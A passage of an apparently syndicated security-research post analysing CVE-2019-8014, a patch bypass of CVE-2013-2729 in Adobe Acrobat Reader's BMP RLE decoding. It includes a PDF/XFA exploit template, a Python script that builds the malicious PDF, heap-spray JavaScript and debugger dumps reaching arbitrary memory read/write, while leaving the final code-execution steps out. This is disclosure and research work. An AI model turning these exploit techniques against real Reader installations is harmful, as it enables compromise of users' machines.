&gt;&gt;</span><br><span class="line">        &gt;&gt;</span><br><span class="line">    &gt;&gt;</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">4</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Length <span class="number">104</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">BT</span><br><span class="line">/F1 <span class="number">12</span> Tf</span><br><span class="line"><span class="number">90</span> <span class="number">692</span> Td</span><br><span class="line">(If you see <span class="keyword">this</span> page, it means that your PDF reader does not support XFA.) Tj</span><br><span class="line">ET</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line"><span class="number">5</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /XFA <span class="number">6</span> <span class="number">0</span> R</span><br><span class="line">&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Filter /FlateDecode</span><br><span class="line">    /Length __STREAM_LENGTH__</span><br><span class="line">&gt;&gt;</span><br><span class="line">stream</span><br><span class="line">&lt;xdp:xdp xmlns:xdp=<span class="string">"http://ns.adobe.com/xdp/"</span>&gt;</span><br><span class="line">  &lt;template xmlns:xfa=<span class="string">"http://www.xfa.org/schema/xfa-template/3.1/"</span> xmlns=<span class="string">"http://www.xfa.org/schema/xfa-template/3.0/"</span>&gt;</span><br><span class="line">    &lt;subform name=<span class="string">"form1"</span> layout=<span class="string">"tb"</span> locale=<span class="string">"en_US"</span> restoreState=<span class="string">"auto"</span>&gt;</span><br><span class="line">      &lt;pageSet&gt;</span><br><span class="line">        &lt;pageArea name=<span class="string">"Page1"</span> id=<span class="string">"Page1"</span>&gt;</span><br><span class="line">          &lt;contentArea x=<span class="string">"0.25in"</span> y=<span class="string">"0.25in"</span> w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>/&gt;</span><br><span class="line">          &lt;medium stock=<span class="string">"default"</span> short=<span class="string">"612pt"</span> long=<span class="string">"792pt"</span>/&gt;</span><br><span class="line">        &lt;<span class="regexp">/pageArea&gt;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>pageSet&gt;</span><br><span class="line">      &lt;subform w=<span class="string">"576pt"</span> h=<span class="string">"756pt"</span>&gt;</span><br><span class="line">        &lt;field name=<span class="string">"ImageCrash"</span>&gt;</span><br><span class="line">          &lt;ui&gt;</span><br><span class="line">            &lt;imageEdit/&gt;</span><br><span class="line">          &lt;<span class="regexp">/ui&gt;</span></span><br><span class="line"><span class="regexp">          &lt;value&gt;</span></span><br><span class="line"><span class="regexp">            &lt;image aspect="actual" contentType="image/</span>bmp<span class="string">"&gt;</span></span><br><span class="line"><span class="string">__IMAGE_BASE64_DATA__</span></span><br><span class="line"><span class="string">            &lt;/image&gt;</span></span><br><span class="line"><span class="string">          &lt;/value&gt;</span></span><br><span class="line"><span class="string">        &lt;/field&gt;</span></span><br><span class="line"><span class="string">      &lt;/subform&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>initialize<span class="string">" name="</span>event__initialize<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed before triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">      &lt;event activity="</span>docReady<span class="string">" ref="</span>$host<span class="string">" name="</span>event__docReady<span class="string">"&gt;</span></span><br><span class="line"><span class="string">        &lt;script contentType="</span>application/x-javascript<span class="string">"&gt;</span></span><br><span class="line"><span class="string">// The JavaScript code will be executed after triggering the vulnerability</span></span><br><span class="line"><span class="string">        &lt;/script&gt;</span></span><br><span class="line"><span class="string">      &lt;/event&gt;</span></span><br><span class="line"><span class="string">    &lt;/subform&gt;</span></span><br><span class="line"><span class="string">  &lt;/template&gt;</span></span><br><span class="line"><span class="string">  &lt;config xmlns="</span>http:<span class="comment">//www.xfa.org/schema/xci/3.0/"&gt;</span></span><br><span class="line">    &lt;agent name=<span class="string">"designer"</span>&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;destination&gt;pdf&lt;<span class="regexp">/destination&gt;</span></span><br><span class="line"><span class="regexp">      &lt;pdf&gt;</span></span><br><span class="line"><span class="regexp">        &lt;!--  [0..n]  --&gt;</span></span><br><span class="line"><span class="regexp">        &lt;fontInfo/</span>&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>agent&gt;</span><br><span class="line">    &lt;present&gt;</span><br><span class="line">      &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">      &lt;pdf&gt;</span><br><span class="line">        &lt;!--  [<span class="number">0.</span>.n]  --&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">1.7</span>&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">        &lt;adobeExtensionLevel&gt;5&lt;/</span>adobeExtensionLevel&gt;</span><br><span class="line">      &lt;<span class="regexp">/pdf&gt;</span></span><br><span class="line"><span class="regexp">      &lt;common/</span>&gt;</span><br><span class="line">      &lt;xdp&gt;</span><br><span class="line">        &lt;packets&gt;*<span class="xml"><span class="tag">&lt;/<span class="name">packets</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/xdp&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>present&gt;</span><br><span class="line">  &lt;<span class="regexp">/config&gt;</span></span><br><span class="line"><span class="regexp">  &lt;xfa:datasets xmlns:xfa="http:/</span><span class="regexp">/www.xfa.org/</span>schema/xfa-data/<span class="number">1.0</span>/<span class="string">"&gt;</span></span><br><span class="line"><span class="string">    &lt;xfa:data xfa:dataNode="</span>dataGroup<span class="string">"/&gt;</span></span><br><span class="line"><span class="string">  &lt;/xfa:datasets&gt;</span></span><br><span class="line"><span class="string">  &lt;xfdf xmlns="</span>http:<span class="comment">//ns.adobe.com/xfdf/" xml:space="preserve"&gt;</span></span><br><span class="line">    &lt;annots/&gt;</span><br><span class="line">  &lt;<span class="regexp">/xfdf&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>xdp:xdp&gt;</span><br><span class="line">endstream</span><br><span class="line">endobj</span><br><span class="line">xref</span><br><span class="line"><span class="number">0</span> <span class="number">7</span></span><br><span class="line"><span class="number">0000000000</span> <span class="number">65535</span> f </span><br><span class="line"><span class="number">0000000009</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000237</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000306</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000587</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000746</span> <span class="number">00000</span> n </span><br><span class="line"><span class="number">0000000782</span> <span class="number">00000</span> n </span><br><span class="line">trailer</span><br><span class="line">&lt;&lt;</span><br><span class="line">    /Root <span class="number">1</span> <span class="number">0</span> R</span><br><span class="line">    /Size <span class="number">7</span></span><br><span class="line">&gt;&gt;</span><br><span class="line">startxref</span><br><span class="line">__XREF_OFFSET__</span><br><span class="line">%%EOF</span><br></pre></td></tr></table></figure><p>The size of the generated BMP file will be larger than 60MB. And it will be encoded in base64 and embedded within <code>6 0 obj</code> of the PDF file. To reduce the file size, this object will be compressed using the zlib/deflate compression method.</p><p>To exploit the vulnerability, weâ€™ll need to have chances to run JavaScript code before and after triggering the vulnerability. This can be done by putting the JavaScript code within the <code>initialize</code> event and the <code>docReady</code> event.</p><p>Following python code can be used to generate the PDF file.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_template</span><span class="params">(template_path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(template_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    xdp_begin = data.find(<span class="string">'&lt;xdp:xdp'</span>)</span><br><span class="line">    xdp_end = data.find(<span class="string">'&lt;/xdp:xdp&gt;'</span>) + len(<span class="string">'&lt;/xdp:xdp&gt;'</span>)</span><br><span class="line">    </span><br><span class="line">    part1 = data[:xdp_begin]</span><br><span class="line">    part2 = data[xdp_begin:xdp_end]</span><br><span class="line">    part3 = data[xdp_end:]</span><br><span class="line">    <span class="keyword">return</span> part1, part2, part3</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_pdf</span><span class="params">(image_path, template_path, pdf_path)</span>:</span></span><br><span class="line">    pdf_part1, pdf_part2, pdf_part3 = parse_template(template_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(image_path, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        image_data = base64.b64encode(f.read())</span><br><span class="line">    pdf_part2 = pdf_part2.replace(<span class="string">'__IMAGE_BASE64_DATA__'</span>, image_data)</span><br><span class="line">    pdf_part2 = zlib.compress(pdf_part2)</span><br><span class="line">    </span><br><span class="line">    pdf_part1 = pdf_part1.replace(<span class="string">'__STREAM_LENGTH__'</span>, <span class="string">'%d'</span> % len(pdf_part2))</span><br><span class="line">    </span><br><span class="line">    pdf_data = pdf_part1 + pdf_part2 + pdf_part3</span><br><span class="line">    pdf_data = pdf_data.replace(<span class="string">'__XREF_OFFSET__'</span>, <span class="string">'%d'</span> % pdf_data.find(<span class="string">'xref'</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">with</span> open(pdf_path, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(pdf_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        filename = os.path.basename(sys.argv[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Usage: %s &lt;input.bmp&gt; &lt;template.pdf&gt; &lt;output.pdf&gt;'</span> % filename</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    generate_pdf(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>], sys.argv[<span class="number">3</span>])</span><br></pre></td></tr></table></figure><h3 id="5-5-Exploit-Tricks"><a href="#5-5-Exploit-Tricks" class="headerlink" title="5.5 Exploit Tricks"></a>5.5 Exploit Tricks</h3><h4 id="5-5-1-Memory-Layout-1"><a href="#5-5-1-Memory-Layout-1" class="headerlink" title="5.5.1 Memory Layout (1)"></a>5.5.1 Memory Layout (1)</h4><p>In this case, <code>ArrayBuffer</code> is more suitable for exploiting the vulnerability.</p><p>Firstly, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xE0</code> . And free one <code>ArrayBuffer</code> object of every <code>ArrayBuffer</code> pair to create holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ ArrayBuffer â”‚     Hole    â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">â”‚ &lt;-  0xF0 -&gt; â”‚</span><br></pre></td></tr></table></figure><p>Then we trigger the vulnerability, and the heap buffer of the bitmap will be placed in one of the holes.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ ArrayBuffer â”‚ Bitmap Data â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br></pre></td></tr></table></figure><p>Since we are able to write <code>0xF4</code> bytes backward with value <code>0x10</code> . The backing store of the <code>ArrayBuffer</code> will be filled with <code>0x10</code> .</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 304c8398</span><br><span class="line">;            -, byteLength, viewobj,       -,</span><br><span class="line">304c8398  00000000 10101010 10101010 10101010</span><br><span class="line">;         ArrayBuffer data</span><br><span class="line">304c83a8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83b8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83c8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83d8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83e8  10101010 10101010 10101010 10101010</span><br><span class="line">304c83f8  10101010 10101010 10101010 10101010</span><br><span class="line">304c8408  10101010 10101010 10101010 10101010</span><br><span class="line">304c8418  10101010 10101010 10101010 10101010</span><br><span class="line">304c8428  10101010 10101010 10101010 10101010</span><br><span class="line">304c8438  10101010 10101010 10101010 10101010</span><br><span class="line">304c8448  10101010 10101010 10101010 10101010</span><br><span class="line">304c8458  10101010 10101010 10101010 10101010</span><br><span class="line">304c8468  10101010 10101010 10101010 10101010</span><br><span class="line">304c8478  10101010 10101010 10101010 10101010 ; end of ArrayBuffer</span><br><span class="line">; metadata of next heap buffer (bitmap data)</span><br><span class="line">304c8488  10101010 10101010</span><br><span class="line">; bitmap data begins here</span><br><span class="line">304c8490                    00000000 00000000</span><br></pre></td></tr></table></figure><p>Now the <code>byteLength</code> of the <code>ArrayBuffer</code> object has been changed to <code>0x10101010</code> and we can achieve Out-Of-Bounds access now. So far so good? The fact is that the process will crash immediately since we also changed the <code>DataView</code> pointer.</p><h4 id="5-5-2-Memory-Layout-0"><a href="#5-5-2-Memory-Layout-0" class="headerlink" title="5.5.2 Memory Layout (0)"></a>5.5.2 Memory Layout (0)</h4><p>We can avoid the crash if we can make <code>0x10101010</code> acts like a valid pointer. Obviously, we should arrange the memory layout before triggering the vulnerability. To make it more stable, it should be done even before we create and free the <code>ArrayBuffer</code> objects.</p><p>We need the ability to put any value at any memory address, such as <code>0x10101010</code> . To achieve this goal, we can create lots of <code>ArrayBuffer</code> objects with <code>byteLength</code> setting to <code>0xFFE8</code> . Thatâ€™s a carefully selected size to make sure that the <code>ArrayBuffer</code> objects will be allocated at predictable addresses.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 0xFFE8 -&gt; byteLength</span></span><br><span class="line"><span class="comment">// 0x10 -&gt; sizeof ObjectElements</span></span><br><span class="line"><span class="comment">// 0x08 -&gt; sizeof heap block's metadata</span></span><br><span class="line"><span class="number">0xFFE8</span> + <span class="number">0x10</span> + <span class="number">0x08</span> = <span class="number">0x10000</span></span><br></pre></td></tr></table></figure><p>Iâ€™m not going to discuss how to avoid the crash in details, itâ€™s very easy to figure out the specific conditions. Following code can be used to avoid the crash.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    </span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Itâ€™s not done yet. The process still crashes when we try to create a new <code>DataView</code> object for it. We can avoid the crash using the same tricks. Following is the improved code.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fillHeap</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">0x1200</span>);</span><br><span class="line">    array[<span class="number">0</span>] = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0xFFE8</span>);</span><br><span class="line">    <span class="keyword">var</span> dv = <span class="keyword">new</span> <span class="built_in">DataView</span>(array[<span class="number">0</span>]);</span><br><span class="line">    <span class="comment">// avoid crash when triggering the vulnerability</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFB8</span>, <span class="number">0x10100058</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0</span>, <span class="number">0x10100158</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0xFFA8</span>, <span class="number">0x10100258</span>, <span class="literal">true</span>);</span><br><span class="line">    dv.setUint32(<span class="number">0x200</span> + <span class="number">0x14</span>, <span class="number">0x10100358</span>, <span class="literal">true</span>);</span><br><span class="line">    <span class="comment">// avoid crash when creating new DataView objects</span></span><br><span class="line">    dv.setUint32(<span class="number">0xFFA4</span>, <span class="number">0x10100458</span>, <span class="literal">true</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>; i &amp;lt; array.length; ++i) &#123;</span><br><span class="line">        array[i] = array[<span class="number">0</span>].slice();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="5-5-3-Global-Read-Write"><a href="#5-5-3-Global-Read-Write" class="headerlink" title="5.5.3 Global Read / Write"></a>5.5.3 Global Read / Write</h4><p>Once we overwrote the <code>byteLength</code> of any <code>ArrayBuffer</code> object with <code>0x10101010</code> , we can leverage this <code>ArrayBuffer</code> object to overwrite next oneâ€™s <code>byteLength</code> to <code>0xFFFFFFFF</code> . Itâ€™s very easy to search the next <code>ArrayBuffer</code> object if we put a flag value within all the <code>ArrayBuffer</code> objects.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  (1)byteLength            (3)Global Access</span><br><span class="line"> â”Œâ”€&lt;â”€â”€â”€&lt;â”€â”€â”€&lt;â”€â”€â”€â”            &lt;â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€&gt;</span><br><span class="line">â”Œâ”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span><br><span class="line">â”‚ ArrayBuffer â”‚ Bitmap Data â”‚ ArrayBuffer â”‚     Hole    â”‚</span><br><span class="line">â””â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span><br><span class="line">       â””â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€&gt;â”€â”€â”€â”€&gt;â”€â”˜</span><br><span class="line">        (2) byteLength to -1</span><br></pre></td></tr></table></figure><p>Now we have the ability to read and write any memory address within the user space.</p><h4 id="5-5-4-Absolute-Address-Access"><a href="#5-5-4-Absolute-Address-Access" class="headerlink" title="5.5.4 Absolute Address Access"></a>5.5.4 Absolute Address Access</h4><p>Once we have the global access ability, we can <strong>search backward</strong> to calculate the base address of the <code>ArrayBuffer</code> objectâ€™s backing store buffer, thus we can read and write at any given absolute memory address.</p><p>We can search two flags, <code>ffeeffee</code> or <code>f0e0d0c0</code> , to calculate the base address. To make it more accurate, the bytes around the flag value also need to be verified.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; dd 30080000</span><br><span class="line">30080000  16b80e9e 0101331b ffeeffee 00000002  ; ffeeffee</span><br><span class="line">30080010  055a00a4 2f0b0010 055a0000 30080000  ; +0x14 -&gt; 30080000</span><br><span class="line">30080020  00000fcf 30080040 3104f000 000002e5</span><br><span class="line">30080030  00000001 00000000 30d69ff0 30d69ff0</span><br><span class="line">30080040  3eb82e96 08013313 00000000 0000ffe8</span><br><span class="line">30080050  00000000 00000000 10100158 00000000</span><br><span class="line">30080060  00000000 00000000 00000000 00000000</span><br><span class="line">30080070  00000000 00000000 00000000 00000000</span><br><span class="line"></span><br><span class="line">0:014&gt; dd 305f4000</span><br><span class="line">305f4000  00000000 00000000 6ab08d69 0858b71a</span><br><span class="line">305f4010  0bbab388 30330080 0ff00112 f0e0d0c0  ; f0e0d0c0</span><br><span class="line">305f4020  15dc2c3f 00000430 305f402c d13bc929  ; +0x0C -&gt; 305f402c</span><br><span class="line">305f4030  e5c521a7 d9b264d4 919cee58 45da954e</span><br><span class="line">305f4040  5c3f608b 2b5fd340 0bae3aa9 2b5fd340</span><br><span class="line">305f4050  0fae32aa d13bc929 e5c521a7 d9b264d4</span><br><span class="line">305f4060  919cee58 45da954e 9c3f608b f952aa94</span><br><span class="line">305f4070  989c772a a1dd934a ac5b154b 2fadd038</span><br></pre></td></tr></table></figure><h4 id="5-5-5-Remaining-Steps"><a href="#5-5-5-Remaining-Steps" class="headerlink" title="5.5.5 Remaining Steps"></a>5.5.5 Remaining Steps</h4><p>Once we can read and write at any given absolute memory address, itâ€™s very easy to achieve code execution. Following are the remaining steps that will not be discussed in this post:</p><ul><li>EIP hijack</li><li>ASLR bypass</li><li>DEP bypass</li><li>CFG bypass</li></ul><h2 id="0x06-CVE-2013-2729"><a href="#0x06-CVE-2013-2729" class="headerlink" title="0x06. CVE-2013-2729"></a>0x06. CVE-2013-2729</h2><p>Three integer overflows were found within the handling of RLE compressed data, one in RLE8 decompression and the other two in RLE4 decompression.</p><p>Why shouldnâ€™t we found four? Because another one have been patched six years ago. You can read <a href="http://blog.binamuse.com/2013/05/readerbmprle.html" target="_blank" rel="noopener">feliamâ€™s write up for CVE-2013-2729</a> if you havenâ€™t read it yet.</p><p>Also, the patch for CVE-2013-2729 can be found within the handling of RLE8 compressed data.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dst_xpos = BYTE1(cmd) + xpos;</span><br><span class="line"><span class="keyword">if</span> ( ypos &gt;= height || dst_xpos &lt; xpos || </span><br><span class="line">     dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  <span class="comment">// overflow check</span></span><br><span class="line">  <span class="keyword">goto</span> LABEL_170;         <span class="comment">// CxxThrowException</span></span><br></pre></td></tr></table></figure><p>Itâ€™s astonishing that Adobe only patched the case that was reported and ignored the other three.</p><h2 id="0x07-Lessons-Learned"><a href="#0x07-Lessons-Learned" class="headerlink" title="0x07. Lessons Learned"></a>0x07. Lessons Learned</h2><p>For product developers, please try to understand the root cause of the vulnerability and eliminate similar ones as much as you can.</p><p>For security researchers, patch analysis is a good way to figure out what the developers were thinking, and maybe you can find bypass solutions (this happens sometimes).</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;em&gt;This post provides detailed analysis for CVE-2019-8014 which was fixed in Adobe Acrobat Reader / Pro DC recently. Interestingly, itâ€™s a patch bypass of CVE-2013-2729 which was &lt;del&gt;&lt;strong&gt;fixed&lt;/strong&gt;&lt;/del&gt; six years ago. This post also discusses how to exploit the vulnerability.&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Author: &lt;strong&gt;Ke Liu of Tencent Security Xuanwu Lab&lt;/strong&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Vulnerability" scheme="http://programlife.net/categories/Vulnerability/"/>
    
      <category term="Analysis" scheme="http://programlife.net/categories/Vulnerability/Analysis/"/>
    
    
      <category term="BMP" scheme="http://programlife.net/tags/BMP/"/>
    
      <category term="Adobe Reader" scheme="http://programlife.net/tags/Adobe-Reader/"/>
    
      <category term="PDF" scheme="http://programlife.net/tags/PDF/"/>
    
      <category term="CVE-2019-8014" scheme="http://programlife.net/tags/CVE-2019-8014/"/>
    
      <category term="CVE-2013-2729" scheme="http://programlife.net/tags/CVE-2013-2729/"/>
    
      <category term="XFA" scheme="http://programlife.net/tags/XFA/"/>
    
      <category term="RLE" scheme="http://programlife.net/tags/RLE/"/>
    
